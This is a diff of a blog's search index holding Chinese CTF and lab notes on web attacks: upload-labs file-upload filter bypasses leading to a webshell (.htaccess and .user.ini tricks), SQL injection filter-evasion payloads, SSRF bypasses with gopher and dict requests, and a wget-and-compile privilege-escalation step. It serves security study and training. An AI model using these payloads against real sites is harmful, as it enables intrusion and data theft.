@@ -1,34 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>upload-labs1~11</title>
-    <url>/2020/12/20/1/</url>
-    <content><![CDATA[<p>webshell：以网页文件形式存在的一种命令执行环境（是一种网页后门），即网页木马文件。</p>
-<span id="more"></span>
-
-<p><strong>题目中出现的UPLOAD_PATH都是我们靶场文件夹下面的upload文件夹，如果没有请手工创建。</strong><br><img src="/2020/12/20/1/00.jpg"></p>
-<h3 id="Pass-01-js检查"><a href="#Pass-01-js检查" class="headerlink" title="Pass-01(js检查)"></a>Pass-01(js检查)</h3><p><img src="/2020/12/20/1/01.png"><br>上传一句话木马，这明显的是一个js的alert提示框。我们就来尝试进行绕过。<br>第一关是一个针对于前端的验证，也就是使用JavaScript进行验证。</p>
-<h4 id="方法1：brup抓包改包绕过前端"><a href="#方法1：brup抓包改包绕过前端" class="headerlink" title="方法1：brup抓包改包绕过前端"></a>方法1：brup抓包改包绕过前端</h4><p>尝试上传一个jpg格式的图片，成功。<br><img src="/2020/12/20/1/0.png"><br>提示：本pass在客户端使用js对不合法图片进行检查!<br>判断文件后缀的代码在前端还是后端，尝试上传一句话木马，用burp进行抓包，并没有发包，说明后缀代码在前端。<br>将文件php后缀改成jpg后上传,可以上传<br><img src="/2020/12/20/1/1.png"><br>再进行抓包，在把后缀jpg改成php，forward。<br><img src="/2020/12/20/1/2.png"><br>查看图像地址，成功修改。<br><img src="/2020/12/20/1/3.png"><br>使用中国蚁剑连<br><img src="/2020/12/20/1/4.png"></p>
-<h4 id="方法2：审查元素，删除判断函数"><a href="#方法2：审查元素，删除判断函数" class="headerlink" title="方法2：审查元素，删除判断函数"></a>方法2：审查元素，删除判断函数</h4><p><img src="/2020/12/20/1/5.png">删除这个函数再上传即可。</p>
-<h4 id="方法3-浏览器禁用js"><a href="#方法3-浏览器禁用js" class="headerlink" title="方法3:浏览器禁用js"></a>方法3:浏览器禁用js</h4><p><img src="/2020/12/20/1/00.png"><br>进去后搜索javascript.enabled改成flase即可。</p>
-<h3 id="Pass-02-content-type检查"><a href="#Pass-02-content-type检查" class="headerlink" title="Pass-02(content-type检查)"></a>Pass-02(content-type检查)</h3><p>mime:多用途互联网邮件扩展类型。<br>是设定某种扩展名的文件用一种应用程序来打开的方式类型（规定了扩展名）<br>其content-type（mime）是由客户端根据你上传的文件生成的，但限制只能是jpg/image格式，所以抓包改就好了.<br><img src="/2020/12/20/1/6.png"><br>尝试上传一句话木马，brup抓包，这次发包了。<br>查看源码，后端只检查了content-type，改包一下即可。</p>
-<h3 id="Pass-03-黑名单不全"><a href="#Pass-03-黑名单不全" class="headerlink" title="Pass-03(黑名单不全)"></a>Pass-03(黑名单不全)</h3><p>修改php后缀为php6即可，其他修改方式也可以，除了基础后缀可以，其他的可能需要经过特殊解析。</p>
-<h3 id="Pass-04-上传-htaccess"><a href="#Pass-04-上传-htaccess" class="headerlink" title="Pass-04(上传.htaccess)"></a>Pass-04(上传.htaccess)</h3><p>黑名单中很多后缀，但是没有.htaccess，我们可以上传.htaccess文件更改apache配置<br>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。<br>通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<br><code>&lt;FilesMatch &quot;hack.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code>用记事本写脚本，把jpg修改成php格式，另存为.htaccess名，格式选择全部。</p>
-<h3 id="Pass-05-上传-user-ini"><a href="#Pass-05-上传-user-ini" class="headerlink" title="Pass-05(上传.user.ini)"></a>Pass-05(上传.user.ini)</h3><p><strong>php.ini是php的配置文件,.user.ini中的字段也会被php视为配置文件来处理，从而导致php的文件解析漏洞。</strong></p>
-<p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是.user.ini。<br>引发.user.ini三个条件:服务器语言为php；<br>        服务器使用CGI或FastCGI模式；<br>        上传目录下要有可执行的php文件。<br>我们上传一个内容为auto_prepend_file=1.gif的.user.ini文件，然后在上传一个命名为1.gif的一句话木马，<br>再连接的时候把文件名改成readme.php(这个文件要等待一定时间才能写好。)<br>**.user.ini文件里的意思是 所有文件都自动包含1.gif文件。.user.ini相当于一个用户自定义的php.ini。* </p>
-<h3 id="Pass-06-大小写绕过"><a href="#Pass-06-大小写绕过" class="headerlink" title="Pass-06(大小写绕过)"></a>Pass-06(大小写绕过)</h3><h3 id="Pass-07-后缀名加空格"><a href="#Pass-07-后缀名加空格" class="headerlink" title="Pass-07(后缀名加空格)"></a>Pass-07(后缀名加空格)</h3><h3 id="Pass-08-后缀名加-过滤"><a href="#Pass-08-后缀名加-过滤" class="headerlink" title="Pass-08(后缀名加.过滤)"></a>Pass-08(后缀名加.过滤)</h3><p>原理:Windows系统在存储文件时会自动去掉文件名末尾的点和空格。<br>这里url末尾的点，对资源的访问没啥影响，我试了一下，多加几个点或者不加点都能访问到，但是换成其他字符不行。</p>
-<h3 id="Pass-09-后缀名加-DATA"><a href="#Pass-09-后缀名加-DATA" class="headerlink" title="Pass-09(后缀名加::$DATA)"></a>Pass-09(后缀名加::$DATA)</h3><p>原理:在php+Windows的环境下，如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理,不会检测后缀名,且保持::$DATA之前的文件名<br><img src="/2020/12/20/1/8.png"><br>查看图片<br><img src="/2020/12/20/1/9.png">将后缀::DATA去掉即可。<br>用中国蚁剑连接成功。</p>
-<h3 id="Pass-10-点空格点过滤"><a href="#Pass-10-点空格点过滤" class="headerlink" title="Pass-10(点空格点过滤)"></a>Pass-10(点空格点过滤)</h3><h3 id="Pass-11-双写php过滤-，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。"><a href="#Pass-11-双写php过滤-，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。" class="headerlink" title="Pass-11(双写php过滤)，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。"></a>Pass-11(双写php过滤)，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。</h3><p>​        </p>
-<p>补充：</p>
-<p>在Apache的解析顺序中，是从右到左解析，如果最右侧的扩展名不可识别，就继续往左判断，直到可解析为止</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果上传文件名为1.php.xxxx</span><br><span class="line">因为后缀xxxx无法解析，所以只能解析1.php</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>upload-labs12~17</title>
     <url>/2020/12/23/2/</url>
     <content><![CDATA[<h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><h4 id="白名单和黑名单"><a href="#白名单和黑名单" class="headerlink" title="白名单和黑名单"></a>白名单和黑名单</h4><p><strong>白名单：设置能通过的，白名单以外的不能通过。<br>黑名单:  不能通过，除黑名单以外可以通过。</strong></p>
@@ -81,6 +53,34 @@
 ]]></content>
       <tags>
         <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>upload-labs1~11</title>
+    <url>/2020/12/20/1/</url>
+    <content><![CDATA[<p>webshell：以网页文件形式存在的一种命令执行环境（是一种网页后门），即网页木马文件。</p>
+<span id="more"></span>
+
+<p><strong>题目中出现的UPLOAD_PATH都是我们靶场文件夹下面的upload文件夹，如果没有请手工创建。</strong><br><img src="/2020/12/20/1/00.jpg"></p>
+<h3 id="Pass-01-js检查"><a href="#Pass-01-js检查" class="headerlink" title="Pass-01(js检查)"></a>Pass-01(js检查)</h3><p><img src="/2020/12/20/1/01.png"><br>上传一句话木马，这明显的是一个js的alert提示框。我们就来尝试进行绕过。<br>第一关是一个针对于前端的验证，也就是使用JavaScript进行验证。</p>
+<h4 id="方法1：brup抓包改包绕过前端"><a href="#方法1：brup抓包改包绕过前端" class="headerlink" title="方法1：brup抓包改包绕过前端"></a>方法1：brup抓包改包绕过前端</h4><p>尝试上传一个jpg格式的图片，成功。<br><img src="/2020/12/20/1/0.png"><br>提示：本pass在客户端使用js对不合法图片进行检查!<br>判断文件后缀的代码在前端还是后端，尝试上传一句话木马，用burp进行抓包，并没有发包，说明后缀代码在前端。<br>将文件php后缀改成jpg后上传,可以上传<br><img src="/2020/12/20/1/1.png"><br>再进行抓包，在把后缀jpg改成php，forward。<br><img src="/2020/12/20/1/2.png"><br>查看图像地址，成功修改。<br><img src="/2020/12/20/1/3.png"><br>使用中国蚁剑连<br><img src="/2020/12/20/1/4.png"></p>
+<h4 id="方法2：审查元素，删除判断函数"><a href="#方法2：审查元素，删除判断函数" class="headerlink" title="方法2：审查元素，删除判断函数"></a>方法2：审查元素，删除判断函数</h4><p><img src="/2020/12/20/1/5.png">删除这个函数再上传即可。</p>
+<h4 id="方法3-浏览器禁用js"><a href="#方法3-浏览器禁用js" class="headerlink" title="方法3:浏览器禁用js"></a>方法3:浏览器禁用js</h4><p><img src="/2020/12/20/1/00.png"><br>进去后搜索javascript.enabled改成flase即可。</p>
+<h3 id="Pass-02-content-type检查"><a href="#Pass-02-content-type检查" class="headerlink" title="Pass-02(content-type检查)"></a>Pass-02(content-type检查)</h3><p>mime:多用途互联网邮件扩展类型。<br>是设定某种扩展名的文件用一种应用程序来打开的方式类型（规定了扩展名）<br>其content-type（mime）是由客户端根据你上传的文件生成的，但限制只能是jpg/image格式，所以抓包改就好了.<br><img src="/2020/12/20/1/6.png"><br>尝试上传一句话木马，brup抓包，这次发包了。<br>查看源码，后端只检查了content-type，改包一下即可。</p>
+<h3 id="Pass-03-黑名单不全"><a href="#Pass-03-黑名单不全" class="headerlink" title="Pass-03(黑名单不全)"></a>Pass-03(黑名单不全)</h3><p>修改php后缀为php6即可，其他修改方式也可以，除了基础后缀可以，其他的可能需要经过特殊解析。</p>
+<h3 id="Pass-04-上传-htaccess"><a href="#Pass-04-上传-htaccess" class="headerlink" title="Pass-04(上传.htaccess)"></a>Pass-04(上传.htaccess)</h3><p>黑名单中很多后缀，但是没有.htaccess，我们可以上传.htaccess文件更改apache配置<br>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。<br>通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<br><code>&lt;FilesMatch &quot;hack.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code>用记事本写脚本，把jpg修改成php格式，另存为.htaccess名，格式选择全部。</p>
+<h3 id="Pass-05-上传-user-ini"><a href="#Pass-05-上传-user-ini" class="headerlink" title="Pass-05(上传.user.ini)"></a>Pass-05(上传.user.ini)</h3><p><strong>php.ini是php的配置文件,.user.ini中的字段也会被php视为配置文件来处理，从而导致php的文件解析漏洞。</strong></p>
+<p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是.user.ini。<br>引发.user.ini三个条件:服务器语言为php；<br>        服务器使用CGI或FastCGI模式；<br>        上传目录下要有可执行的php文件。<br>我们上传一个内容为auto_prepend_file=1.gif的.user.ini文件，然后在上传一个命名为1.gif的一句话木马，<br>再连接的时候把文件名改成readme.php(这个文件要等待一定时间才能写好。)<br>**.user.ini文件里的意思是 所有文件都自动包含1.gif文件。.user.ini相当于一个用户自定义的php.ini。* </p>
+<h3 id="Pass-06-大小写绕过"><a href="#Pass-06-大小写绕过" class="headerlink" title="Pass-06(大小写绕过)"></a>Pass-06(大小写绕过)</h3><h3 id="Pass-07-后缀名加空格"><a href="#Pass-07-后缀名加空格" class="headerlink" title="Pass-07(后缀名加空格)"></a>Pass-07(后缀名加空格)</h3><h3 id="Pass-08-后缀名加-过滤"><a href="#Pass-08-后缀名加-过滤" class="headerlink" title="Pass-08(后缀名加.过滤)"></a>Pass-08(后缀名加.过滤)</h3><p>原理:Windows系统在存储文件时会自动去掉文件名末尾的点和空格。<br>这里url末尾的点，对资源的访问没啥影响，我试了一下，多加几个点或者不加点都能访问到，但是换成其他字符不行。</p>
+<h3 id="Pass-09-后缀名加-DATA"><a href="#Pass-09-后缀名加-DATA" class="headerlink" title="Pass-09(后缀名加::$DATA)"></a>Pass-09(后缀名加::$DATA)</h3><p>原理:在php+Windows的环境下，如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理,不会检测后缀名,且保持::$DATA之前的文件名<br><img src="/2020/12/20/1/8.png"><br>查看图片<br><img src="/2020/12/20/1/9.png">将后缀::DATA去掉即可。<br>用中国蚁剑连接成功。</p>
+<h3 id="Pass-10-点空格点过滤"><a href="#Pass-10-点空格点过滤" class="headerlink" title="Pass-10(点空格点过滤)"></a>Pass-10(点空格点过滤)</h3><h3 id="Pass-11-双写php过滤-，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。"><a href="#Pass-11-双写php过滤-，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。" class="headerlink" title="Pass-11(双写php过滤)，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。"></a>Pass-11(双写php过滤)，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。</h3><p>​        </p>
+<p>补充：</p>
+<p>在Apache的解析顺序中，是从右到左解析，如果最右侧的扩展名不可识别，就继续往左判断，直到可解析为止</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果上传文件名为1.php.xxxx</span><br><span class="line">因为后缀xxxx无法解析，所以只能解析1.php</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -165,138 +165,6 @@
 <ul>
 <li>flag被注释的时候，执行命令查看flag时，可用type flag。</li>
 </ul>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF-SQL</title>
-    <url>/2021/05/20/CTF-SQL/</url>
-    <content><![CDATA[<h4 id="CTF-SQL注入基础"><a href="#CTF-SQL注入基础" class="headerlink" title="CTF-SQL注入基础"></a>CTF-SQL注入基础</h4><h4 id="万能密码："><a href="#万能密码：" class="headerlink" title="万能密码："></a>万能密码：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<p><strong>主要是逻辑or，返回true，密码正确。</strong></p>
-<ul>
-<li>burp需要使用+或%20代替空格</li>
-</ul>
-<p><strong>sql注入类型：数字型、字符串类型</strong></p>
-<ul>
-<li>sql语句中的括号不代表实际意义，主要用于优先级处理。</li>
-</ul>
-<p><strong>sql注入可能存在的位置：</strong></p>
-<p>1、URL提交参数，GET型</p>
-<p>2、HTTP请求主体，POST型</p>
-<p>3、请求头(cookie,user-agent,referer)</p>
-<p><strong>sql注入利用</strong></p>
-<p>1、获取数据库信息</p>
-<p>2、获取系统命令执行shell</p>
-<p>3、上传、下载服务器文件(webshell)等</p>
-<p><strong>技法：</strong></p>
-<p><strong>联合注入、布尔盲注、延时注入、报错注入、堆叠注入、宽字节注入、二次注入、无列名注入等等。</strong></p>
-<h4 id="CTF-SQL注入技巧"><a href="#CTF-SQL注入技巧" class="headerlink" title="CTF-SQL注入技巧"></a>CTF-SQL注入技巧</h4><p>url中字符的特殊含义：</p>
-<p>1、&amp;表示get提交参数的分隔符，如果sql注入中将and替换成&amp;&amp;，要对&amp;进行URL编码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;-&gt;%26%26</span><br></pre></td></tr></table></figure>
-
-
-
-<p>2、#表示锚点，点击当前的链接会跳转到当前页面的某个位置，sql注入需要对#进行URL编码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#-&gt;%23</span><br></pre></td></tr></table></figure>
-
-
-
-<p>3、web站点默认访问index开头的页面，可以省略index.php</p>
-<p>4、web站点默认端口使用80端口，可省略。若非80端口，不可省略。</p>
-<p>绕过过滤姿势</p>
-<p><em>1、常用注释符</em></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--空格</span><br><span class="line">--+</span><br><span class="line">/*注释*/</span><br><span class="line">在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执	行</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
-
-<p><em>2、大小写绕过</em></p>
-<p><em>3、双写绕过</em></p>
-<p><em>4、内联注释绕过</em></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=1 union /*!select*/ 1,2,3;</span><br><span class="line">加了感叹号，select会被执行。</span><br></pre></td></tr></table></figure>
-
-<p><em>5、单引号过滤</em></p>
-<ul>
-<li>十六进制绕过</li>
-<li>char函数绕过</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char(ascii)+char(ascii)+char(ascii)</span><br></pre></td></tr></table></figure>
-
-
-
-<p><em>6、空格过滤</em></p>
-<ul>
-<li>括号绕过</li>
-</ul>
-<p>遵循查什么，从哪里，符合条件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select(id)from(users)where(id=1)</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>注释符绕过空格</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格-&gt;/**/</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>反引号绕过</li>
-</ul>
-<p>由于数据库默认识别关键字，不需要加引号，但是无法自动识别用户定义的表名和字段名，此时使用反引号指定。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select*from`users`where`id`=1</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>其他空白字符</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ascii table：</span><br><span class="line"># TAB水平 09 url编码 %09</span><br><span class="line"># 新行  0A %0A</span><br><span class="line"># 新页  0C %0C</span><br><span class="line"># 回车  0D %0D</span><br><span class="line"># TAB垂直 0B        %0B</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p><em>7、等号过滤</em></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like或rlike</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">between and</span><br><span class="line">select * from users where id between 1 and 1</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regexp代替=</span><br></pre></td></tr></table></figure>
-
-
-
-<p><em>8、逗号绕过</em></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr(&#x27;users&#x27;,1,1)=</span><br><span class="line">select substr(&#x27;users&#x27; from 1 for 1)</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users limit 0,1</span><br><span class="line">select * from users limit 1 offset 0;</span><br><span class="line">第一个参数不为0,从1开始</span><br><span class="line">第二个参数为偏移量</span><br></pre></td></tr></table></figure>
-
-
-
-<p><em>9、过滤了运算比较符号</em></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">greatest(n1,n2,n3..)返回最大值</span><br><span class="line"></span><br><span class="line">greatest(ascii(substr(database(),1,1)),1)=97;</span><br><span class="line"></span><br><span class="line">least(n1,n2,n3..)返回最小值</span><br><span class="line"></span><br><span class="line">strcmp(str1,str2)</span><br><span class="line">所有字符串相等返回0,小于返回-1,大于返回1</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="约束注入"><a href="#约束注入" class="headerlink" title="约束注入"></a>约束注入</h4><p>一般注入点存在注册的时候，对于管理员密码的任意修改</p>
-<p>关键函数varchar()，当sql语句语句超过varchar定于的最大长度，并且没有唯一键约束。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin                           x</span><br></pre></td></tr></table></figure>
-
-
-
-<p>SQL语句设置和取消唯一键约束：</p>
-<p>取消唯一键</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table admin drop unique username</span><br></pre></td></tr></table></figure>
-
-<p>设置唯一键</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table admin add unique (username)</span><br></pre></td></tr></table></figure>
-
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -393,97 +261,6 @@
 
 <p>5、提权</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a </span><br><span class="line">查看版本相关信息</span><br><span class="line">百度搜索相关漏洞</span><br><span class="line">https://www.exploit-db.com/</span><br><span class="line"></span><br><span class="line">mkdir tmp</span><br><span class="line">cd tmp</span><br><span class="line">wget ... poc.c 下载相关漏洞</span><br><span class="line">gcc poc.c </span><br><span class="line">然后执行新生成的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF-SSRF</title>
-    <url>/2021/05/25/CTF-SSRF/</url>
-    <content><![CDATA[<h1 id="CTF-SSRF"><a href="#CTF-SSRF" class="headerlink" title="CTF-SSRF"></a>CTF-SSRF</h1><h3 id="SSRF介绍与简单介绍"><a href="#SSRF介绍与简单介绍" class="headerlink" title="SSRF介绍与简单介绍"></a>SSRF介绍与简单介绍</h3><p>原理：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器请求伪造是一种由web服务器发出请求的漏洞，它能够请求到与它相连的内网资源。因此SSRF主要测试目标是企业的内网系统。</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">很多web应用提供从其他服务器获取数据的功能，可根据用户提交URL访问对应资源(获取图片，下载文件，读取内容等)。</span><br><span class="line">如果该功能作为代理通道去访问本地或远程服务器，这就是所谓的SSRF。</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h4 id="SSRF可能造成的危害"><a href="#SSRF可能造成的危害" class="headerlink" title="SSRF可能造成的危害"></a>SSRF可能造成的危害</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、对内网进行信息探测-端口扫描</span><br><span class="line">2、对内网服务区进行漏洞扫描利用</span><br><span class="line">3、对内网web的应用进行安全测试，如Structs、Sql注入漏洞利用。</span><br><span class="line">4、对内网中的文件读取(file协议)</span><br><span class="line">5、在PHP环境中，如果搭建expect扩展，可能被命令执行。</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h4 id="SSRF-漏洞-常用函数"><a href="#SSRF-漏洞-常用函数" class="headerlink" title="SSRF 漏洞 常用函数"></a>SSRF 漏洞 常用函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、file_get_contents</span><br><span class="line">PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</span><br><span class="line">-将整个文件读入一个字符串。</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、fsockopen函数</span><br><span class="line">(PHP 4, PHP 5, PHP 7, PHP 8)</span><br><span class="line">-打开一个网络连接或者一个Unix套接字连接</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl函数</span><br><span class="line">参考文档：https://www.php.net/manual/zh/book.curl.php</span><br><span class="line">PHP支持Daniel Stenberg创建的libcurl库，能够连接通讯各种服务器、使用各种协议。libcurl目前支持的协议有http、https、ftp、gopher、telnet、dict、file、ldap。libcurl同时支持HTTPS证书，HTTP POST、HTTP PUT、FTP上传(也能通过PHP的FTP扩展完成)、HTTP基于表单上传、代理、cookies、用户名+密码的认证。</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="SSRF绕过限制姿势"><a href="#SSRF绕过限制姿势" class="headerlink" title="SSRF绕过限制姿势"></a>SSRF绕过限制姿势</h3><h4 id="1、添加端口"><a href="#1、添加端口" class="headerlink" title="1、添加端口"></a>1、添加端口</h4><p>HTTP请求URL中默认以80端口。</p>
-<h4 id="2、短网址"><a href="#2、短网址" class="headerlink" title="2、短网址"></a>2、短网址</h4><p><a href="https://sina.lt/">https://sina.lt/</a></p>
-<h4 id="3、指定任意IP的域名xip-io"><a href="#3、指定任意IP的域名xip-io" class="headerlink" title="3、指定任意IP的域名xip.io"></a>3、指定任意IP的域名xip.io</h4><p><a href="https://xip.io/">https://xip.io/</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1.xip.io</span><br><span class="line">www.127.0.0.1.xip.io</span><br><span class="line">mysite.127.0.0.1.xip.io</span><br><span class="line">foo.bar.127.0.0.1.xip.io</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="4、数制绕过"><a href="#4、数制绕过" class="headerlink" title="4、数制绕过"></a>4、数制绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IP地址是32位二进制数-&gt;4个字节</span><br><span class="line">目前看到的IP地址都是采用点分十进制组成的。</span><br><span class="line">127.0.0.1 -&gt;  01111111.00000000.00000000.00000001</span><br><span class="line">转化为十进制 -&gt; 2130706433</span><br><span class="line">八进制-&gt; 0177.00.00.01</span><br><span class="line">十六进制 -&gt; 0x7f.0x0.0x0.0x1</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="5、-跳转"><a href="#5、-跳转" class="headerlink" title="5、@跳转"></a>5、@跳转</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在URL中使用@可跳转到指定的URL</span><br><span class="line">http://www.baidu.com@127.0.0.1</span><br><span class="line">变成http://127.0.0.1</span><br><span class="line">https://www.baidu.com@127.0.0.1</span><br><span class="line">变成https://127.0.0.1</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="SSRF可用协议"><a href="#SSRF可用协议" class="headerlink" title="SSRF可用协议"></a>SSRF可用协议</h3><h4 id="1、file协议"><a href="#1、file协议" class="headerlink" title="1、file协议"></a>1、file协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file：//文件路径</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="2、dict协议"><a href="#2、dict协议" class="headerlink" title="2、dict协议"></a>2、dict协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用dict协议可探测端口的开放情况和指纹信息</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令格式：</span><br><span class="line">dict://serverip:port/info</span><br><span class="line">dict://127.0.0.1:80/info</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="3、gopher协议"><a href="#3、gopher协议" class="headerlink" title="3、gopher协议"></a>3、gopher协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gopher是internet上非常有名的信息查找系统，它将internet的文件组织成某种索引，很方便从internet的一处带到另一处。在www出现之前，Gopher是internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但是www出现之后，Gopher地位受到打击。Gopher协议在SSRF可以是一个万能协议，可进行GET、POST请求发送。</span><br></pre></td></tr></table></figure>
-
-
-
-<p>构造Gopher数据：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">抓包后将整个数据包的</span><br><span class="line">空格替换成%20</span><br><span class="line">问好替换成%3f</span><br><span class="line">回车换行替换成%0d%0a</span><br><span class="line">最后一行也需要%0d%0a</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>gopher GET请求</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl gopher://ip:端口/_数据</span><br><span class="line"></span><br><span class="line">如</span><br><span class="line">curl gopher://127.0.0.1:端口/_GET%20/..../?a=...%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0a</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p><strong>gopher POST请求</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">与get请求类似，但是需要传入更多的相关信息。</span><br><span class="line">必须有</span><br><span class="line"></span><br><span class="line">POST /.../ HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length:9</span><br><span class="line"></span><br><span class="line">a=xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">最终变成</span><br><span class="line">curl gopher://_POST%20/.../%20HTTP/1.1%0d%0aHost:%20xxx%0d0aContent-Type:%20application/x-www-form-urlencoded%0d0aContent-Length%209%0d0a%0d0aa=xxx%0d%0a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">特别注意 POST有两个换号位置。</span><br><span class="line">%0d%0a%0d%0a</span><br></pre></td></tr></table></figure>
-
-
 
 ]]></content>
       <tags>
@@ -627,6 +404,138 @@
 <p>当concat函数被过滤时，可使用<a href="https://blog.csdn.net/qq_41725312/article/details/83039525">make_set函数</a></p>
 <p>如</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and (select extractvalue(2,make_set(3,0x7e,(select * from flag))))--+</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF-SQL</title>
+    <url>/2021/05/20/CTF-SQL/</url>
